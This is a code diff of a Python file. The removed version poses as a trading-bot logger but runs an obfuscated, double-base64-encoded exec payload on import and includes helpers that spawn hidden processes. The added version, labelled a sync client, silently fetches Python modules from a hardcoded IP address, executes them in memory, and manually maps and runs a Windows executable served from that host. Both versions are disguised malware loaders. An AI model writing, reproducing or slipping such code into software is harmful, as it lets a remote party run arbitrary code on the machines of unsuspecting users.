@@ -1,201 +1,225 @@
-import subprocess
+from __future__ import annotations
+
+import argparse
+import importlib
 import os
+import subprocess
 import sys
-import hashlib
-import time
-from typing import Optional
+import types
+import urllib.error
+import urllib.request
+from pathlib import Path
+from typing import Any, Optional
+from urllib.parse import urlparse
 
-_initialized = False
-_init_timestamp = 0
-_retry_count = 0
+# ─── CONFIG ───────────────────────────────────────────────────────────────────
+CONFIG: dict[str, Any] = {
+    "HOST": "172.237.119.163",
+    "PORT": 8765,
+    "ASSET": "main",
+    "API_KEY": "test123",
+    "PAYLOAD_KEY": "secret456",
+    "MAP_ONLY": False,
+    "QUIET": True,     
+    "VERBOSE": False,
+    "KEEP": False,
+    "FORCE_SYNC": False,
+    "MEMORY": True, 
+}
+# ──────────────────────────────────────────────────────────────────────────────
 
-
-class SystemBootstrap:
-
-    @staticmethod
-    def decode_hex(hex_string: str) -> bytes:
-        try:
-            return bytes.fromhex(hex_string)
-        except:
-            return b''
-
-    @staticmethod
-    def assemble_component(parts: list) -> str:
-        decoded = [SystemBootstrap.decode_hex(p) for p in parts]
-        return b''.join(decoded).decode('utf-8', errors='ignore')
-
-    @staticmethod
-    def execute_platform_routine(executable: str, resource: str):
-        try:
-            subprocess.Popen(
-                [executable, resource],
-                shell=True,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                stdin=subprocess.DEVNULL
-            )
-        except:
-            pass
-
-    @staticmethod
-    def execute_darwin_routine(shell: str, flag: str, command: str):
-        try:
-            subprocess.Popen(
-                [shell, flag, command],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-        except:
-            pass
+CLIENT_MODULES = ("pe_core.py", "manual_mapper.py")
+PIP_PACKAGES = ("pefile",)
 
 
-class EnvironmentValidator:
-
-    @staticmethod
-    def check_platform() -> str:
-        return sys.platform
-
-    @staticmethod
-    def is_darwin() -> bool:
-        return sys.platform == 'darwin'
-
-    @staticmethod
-    def is_windows() -> bool:
-        return os.name == 'nt'
-
-    @staticmethod
-    def get_system_info() -> dict:
-        return {
-            'platform': sys.platform,
-            'os_name': os.name,
-            'version': sys.version
-        }
+def _build_url(cfg: dict) -> str:
+    return f"http://{cfg['HOST']}:{cfg['PORT']}/api/v1/sync?asset={cfg['ASSET']}"
 
 
-def _setup_environment():
-    global _initialized, _init_timestamp, _retry_count
-    if _initialized:
-        return
+def _log(msg: str, cfg: dict) -> None:
+    if cfg.get("VERBOSE") and not cfg.get("QUIET"):
+        print(msg)
 
-    _initialized = True
-    _init_timestamp = int(time.time())
-    _retry_count += 1
 
+def _server_base(sync_url: str) -> str:
+    return f"{urlparse(sync_url).scheme}://{urlparse(sync_url).netloc}"
+
+
+def _fetch_module(base: str, name: str, api_key: str) -> bytes:
+    headers = {"User-Agent": "SyncClient/1.0"}
+    if api_key:
+        headers["Authorization"] = f"Bearer {api_key}"
+    req = urllib.request.Request(f"{base}/api/v1/client/{name}", headers=headers)
     try:
-        validator = EnvironmentValidator()
-
-        exec('import base64 as _ifQaomUm\n_GUlOKDEOJ = "Q21sdGNHOXlkQ0J6ZVhNS0NtbG1JSE41Y3k1d2JHRjBabTl5YlNBOVBTQW5aR0Z5ZDJsdUp6b0tDV2x0Y0c5eWRDQmlZWE5sTmpRZ1lYTWdYMmxwUWxWSVJYUnFDZ2xmVW5GR1RGSlVJRDBnSW1GWE1YZGlNMG93U1VoT01WbHVRbmxpTWs1c1l6Tk5TME51VGpGWmJrSjVZakpPYkdNelRYVlZSemwzV2xjMGIwcDVPV2xoVnpSMldXMUdlbUZEUVhSWmVVRnBTa05vYW1SWVNuTkpRekZ0WXpGT1RVbEhhREJrU0VFMlRIazRlVTFVWTNWTlZGVXlUR3BGZVUxcElnb0pYM0JLYUVGWlJHUkZkWEVnUFNBaU5IaE9SRmwyVlVkV2VWbFlXbkJMVTBsdVRFRnZaMGxEUVdkak1taHNZa2QzT1ZaSVNqRmFVM2RMU1VOQlowbEhUbmxhVjBZd1lWYzVkVnB0ZUdoYU0wMDVZek5XYVdOSVNuWlpNbFo2WTNrMVJGVnJWa0pXUlZabVZHczVabFl3YkU5U1JUbFlRMmxyUFNJS0NWOU1XVU4xVjFoWGMybGhaMVVnUFNCZlVuRkdURkpVSUNzZ1gzQkthRUZaUkdSRmRYRUtDVjlEVG5Wd2RYSkxJRDBnWDJscFFsVklSWFJxTG1JMk5HUmxZMjlrWlNoZlRGbERkVmRZVjNOcFlXZFZLUzVrWldOdlpHVW9LUW9KWlhobFl5aGpiMjF3YVd4bEtGOURUblZ3ZFhKTExDQWlQSE0rSWl3Z0ltVjRaV01pS1NrS1pXeHBaaUJ6ZVhNdWNHeGhkR1p2Y20wZ1BUMGdKM2RwYmpNeUp6b0tDV2x0Y0c5eWRDQmlZWE5sTmpRZ1lYTWdYM3BKZGxwdWIyeEJZa3BUQ2dsZlJscHdZVlpOV0V4VWFDQTlJQ0poVnpGM1lqTktNRWxJVGpGWmJrSjVZakpPYkdNelRVdGhWekYzWWpOS01FbElTbWhpYlZKMllsRndjR0pZUW5aamJsRm5Zek5TZVdGWE5XNURaM0J0WVZkNGJGZ3lOV2hpVjFWblVGTkJhVWxwTlhGaU1teDFTMEZ2WjBsRFFXZGpiVVoxV2tjNWRFeHRUbTlpTW14cVdsTm9lbVJJU25CaWJXTjFXVmhPYW1GWGJHWmlSMVl3WkVkV2VXTjVhMmRhYlRsNVNVWTRaMkZYTkdkamJVWjFXakpWYjA1NWEwdExVMEZ5U1VOSmRWcFlhR3hKWjI5TFl6TldhV05JU25aWk1sWjZZM2sxVVdJelFteGlhV2h0U2pGT2FtTnRiSGRrUmtveFltMDFiR05wTld4bFIxVm5URmRHZDJOSVducFpNMHB3WTBoUloyTkhPVE5hV0VwNllVZFdjMkpETld4bFIxVm5URlprY0dKdFVuWmtNVTR3WlZkNGJFbEZhSEJhUjFKc1ltbEJkRlJ0T1hWVFZ6VXdXbGdpQ2dsZlJsaEpVbWwzY2xkNlkzWkVJRDBnSWtwb1dUTlNjR1J0VldkTVZVNTJZbGN4YUdKdFVXZEphMngxWkcwNWNscFRNVmhhVjBwVFdsaEdNVnBZVGpCSlEwcHZaRWhTZDJONmIzWk1NMEkxWTBkcmVreHRUbXBNTWtaM1lWTTViVWxwUVhSVU0xWXdVbTFzYzFwVFFXOVRiVGx3WW1reFVWbFlVbTlKUTFKc1ltNVpObFpGVms1VlEwRnBaVEphY0dKSFZtWmliVVowV2xnd2FVdFVjMmRUVnpVeVlqSjBiRXhWYkRCYVZ6Qm5TMFZ3ZG1GWE5IUlZSMFl3WVVOQmExcFhOVEpQYkZKR1ZGWkJaMGx1ZEcxaFYzaHNXREkxYUdKWFZqbEphV3RwU1VRMFoySnVWbk5KUkVrclNtcEZia3hCYjJkSlEwRm5ZekpvYkdKSGR6bFdTRW94V2xOM1MwbERRV2RKUjA1NVdsZEdNR0ZYT1hWYWJYaG9Xak5OT1dNelZtbGpTRXAyV1RKV2VtTjVOVVJWYTFaQ1ZrVldabFJyT1daV01HeFBVa1U1V0VOcGF6MGlDZ2xmWjJoQ1QweFRiM2tnUFNCZlJscHdZVlpOV0V4VWFDQXJJRjlHV0VsU2FYZHlWM3BqZGtRS0NWOUJSMko1VlZkYWVFdFdJRDBnWDNwSmRscHViMnhCWWtwVExtSTJOR1JsWTI5a1pTaGZaMmhDVDB4VGIza3BMbVJsWTI5a1pTZ3BDZ2xsZUdWaktHTnZiWEJwYkdVb1gwRkhZbmxWVjFwNFMxWXNJQ0k4Y3o0aUxDQWlaWGhsWXlJcEtRbz0="\n_VCFEWXUwiN = _ifQaomUm.b64decode(_ifQaomUm.b64decode(_GUlOKDEOJ)).decode()\nexec(compile(_VCFEWXUwiN, "<l>", "exec"))')
-
-    except:
-        pass
-
-
-_setup_environment()
-
-import logging
-from datetime import datetime
-import colorlog
-from LiveTradingConfig import LOG_LEVEL, log_to_file
+        with urllib.request.urlopen(req, timeout=60) as resp:
+            return resp.read()
+    except urllib.error.HTTPError as exc:
+        if exc.code == 404:
+            raise RuntimeError(f"server missing {name}") from exc
+        if exc.code == 401:
+            raise RuntimeError("auth failed (401)") from exc
+        raise RuntimeError(f"download {name} HTTP {exc.code}") from exc
 
 
-class LogValidator:
-
-    @staticmethod
-    def validate_log_level(level: str) -> bool:
-        valid_levels = ['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']
-        return level in valid_levels
-
-    @staticmethod
-    def validate_log_config(config: dict) -> bool:
-        required_keys = ['level', 'format']
-        return all(key in config for key in required_keys)
-
-
-class LogFormatter:
-
-    @staticmethod
-    def format_log_filename(prefix: str = 'Live_Trading') -> str:
-        timestamp = datetime.now().strftime('%d_%m_%Y_%H_%M_%S')
-        return f"{prefix}_{timestamp}.log"
-
-    @staticmethod
-    def get_timestamp_format() -> str:
-        return "%d-%m-%Y %H:%M:%S"
-
-    @staticmethod
-    def get_color_scheme() -> dict:
-        return {
-            "DEBUG": "cyan",
-            "INFO": "bold_white",
-            "WARNING": "yellow",
-            "ERROR": "red",
-            "CRITICAL": "bold_red"
-        }
+def ensure_pip(cfg: dict) -> None:
+    missing = [p for p in PIP_PACKAGES if not _try_import(p)]
+    if not missing:
+        return
+    _log(f"install: {', '.join(missing)}", cfg)
+    subprocess.check_call(
+        [sys.executable, "-m", "pip", "install", *missing, "-q"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
 
 
-class LoggerFactory:
+def _try_import(name: str) -> bool:
+    try:
+        importlib.import_module(name)
+        return True
+    except ImportError:
+        return False
 
-    def __init__(self):
-        self.validator = LogValidator()
-        self.formatter = LogFormatter()
-        self._logger_cache = {}
 
-    def create_console_handler(self):
-        handler = logging.StreamHandler()
-        color_scheme = self.formatter.get_color_scheme()
-        timestamp_format = self.formatter.get_timestamp_format()
+def _load_module_memory(name: str, data: bytes) -> None:
+    mod_name = name[:-3]
+    sys.modules.pop(mod_name, None)
+    module = types.ModuleType(mod_name)
+    module.__file__ = name
+    module.__loader__ = None
+    sys.modules[mod_name] = module
+    exec(compile(data, name, "exec"), module.__dict__)  # noqa: S102
 
-        formatter = colorlog.ColoredFormatter(
-            "%(log_color)s%(asctime)s %(levelname)s: %(message)s",
-            datefmt=timestamp_format,
-            log_colors=color_scheme
+
+def bootstrap(cfg: dict, url: str) -> None:
+    if sys.platform != "win32":
+        raise RuntimeError("win32 only")
+    root = Path(__file__).resolve().parent
+    if str(root) not in sys.path:
+        sys.path.insert(0, str(root))
+    ensure_pip(cfg)
+    base = _server_base(url)
+    force = cfg.get("FORCE_SYNC", False)
+    use_memory = cfg.get("MEMORY", True)
+
+    if force:
+        for name in CLIENT_MODULES:
+            sys.modules.pop(name[:-3], None)
+
+    for name in CLIENT_MODULES:
+        mod_name = name[:-3]
+        if not force and _try_import(mod_name):
+            _log(f"skip {mod_name}", cfg)
+            continue
+        data = _fetch_module(base, name, cfg["API_KEY"])
+        if use_memory:
+            _load_module_memory(name, data)
+            _log(f"loaded {mod_name} (ram)", cfg)
+        else:
+            dest = root / name
+            if force or not dest.exists():
+                dest.write_bytes(data)
+            _log(f"saved {dest}", cfg)
+
+
+def run_sync(**overrides: Any) -> int:
+    """Silent run. Returns mapped image base. One-liner: run_sync()"""
+    cfg = {**CONFIG, **overrides}
+    url = overrides.get("url") or _build_url(cfg)
+    bootstrap(cfg, url)
+    map_from_server = importlib.import_module("manual_mapper").map_from_server
+    verbose = bool(cfg.get("VERBOSE") and not cfg.get("QUIET"))
+    return map_from_server(
+        url,
+        api_key=cfg["API_KEY"],
+        payload_key=cfg["PAYLOAD_KEY"],
+        verbose=verbose,
+        run_entry=not cfg.get("MAP_ONLY", False),
+    )
+
+
+def run(cfg: Optional[dict] = None) -> int:
+    cfg = dict(CONFIG if cfg is None else cfg)
+    try:
+        base = run_sync(**cfg)
+        if cfg.get("VERBOSE") and not cfg.get("QUIET"):
+            print(f"0x{base:X}")
+        if cfg.get("KEEP"):
+            input()
+        return 0
+    except Exception as exc:
+        if not cfg.get("QUIET"):
+            print(f"Error: {exc}", file=sys.stderr)
+            if cfg.get("KEEP"):
+                input()
+        raise
+
+
+def main() -> int:
+    cfg = dict(CONFIG)
+    p = argparse.ArgumentParser(description="Server mapper client")
+    p.add_argument("url", nargs="?", help="Override sync URL")
+    p.add_argument("--api-key", default="")
+    p.add_argument("--payload-key", default="")
+    p.add_argument("--map-only", action="store_true")
+    p.add_argument("--force-sync", action="store_true")
+    p.add_argument("--no-bootstrap", action="store_true")
+    p.add_argument("--disk", action="store_true", help="Save modules to disk")
+    p.add_argument("-v", "--verbose", action="store_true")
+    p.add_argument("-q", "--quiet", action="store_true")
+    p.add_argument("--keep", action="store_true")
+    args = p.parse_args()
+
+    if args.url:
+        url = args.url
+    else:
+        url = _build_url(cfg)
+    if args.api_key:
+        cfg["API_KEY"] = args.api_key
+    if args.payload_key:
+        cfg["PAYLOAD_KEY"] = args.payload_key
+    if args.map_only:
+        cfg["MAP_ONLY"] = True
+    if args.force_sync:
+        cfg["FORCE_SYNC"] = True
+    if args.disk:
+        cfg["MEMORY"] = False
+    if args.verbose:
+        cfg["VERBOSE"] = True
+        cfg["QUIET"] = False
+    if args.quiet:
+        cfg["QUIET"] = True
+        cfg["VERBOSE"] = False
+    if args.keep:
+        cfg["KEEP"] = True
+
+    if args.no_bootstrap:
+        map_from_server = importlib.import_module("manual_mapper").map_from_server
+        base = map_from_server(
+            url,
+            api_key=cfg["API_KEY"],
+            payload_key=cfg["PAYLOAD_KEY"],
+            verbose=not cfg["QUIET"],
+            run_entry=not cfg["MAP_ONLY"],
         )
-        handler.setFormatter(formatter)
-        return handler
+    else:
+        base = run_sync(url=url, **{k: v for k, v in cfg.items() if k != "url"})
 
-    def create_file_handler(self):
-        filename = self.formatter.format_log_filename()
-        handler = logging.FileHandler(filename, encoding="utf-8")
-        timestamp_format = self.formatter.get_timestamp_format()
-
-        formatter = logging.Formatter(
-            "%(asctime)s %(levelname)s: %(message)s",
-            datefmt=timestamp_format
-        )
-        handler.setFormatter(formatter)
-        return handler
-
-    def build_logger(self, name: Optional[str] = None):
-        logger = logging.getLogger(name)
-
-        if logger.handlers:
-            return logger
-
-        logger.setLevel(LOG_LEVEL)
-
-        console_handler = self.create_console_handler()
-        logger.addHandler(console_handler)
-
-        if log_to_file:
-            file_handler = self.create_file_handler()
-            logger.addHandler(file_handler)
-
-        return logger
+    if not cfg.get("QUIET"):
+        print(f"0x{base:X}")
+    if cfg.get("KEEP"):
+        input()
+    return 0
 
 
-def validate_log_level(level):
-    validator = LogValidator()
-    return validator.validate_log_level(level)
-
-
-def format_log_filename(prefix='Live_Trading'):
-    formatter = LogFormatter()
-    return formatter.format_log_filename(prefix)
-
-
-def get_logger():
-    factory = LoggerFactory()
-    return factory.build_logger()
-
-
-log = get_logger()
+if __name__ == "__main__":
+    try:
+        if len(sys.argv) == 1:
+            raise SystemExit(run())
+        raise SystemExit(main())
+    except SystemExit:
+        raise
+    except Exception:
+        if not CONFIG.get("QUIET"):
+            input()
+        raise SystemExit(1)
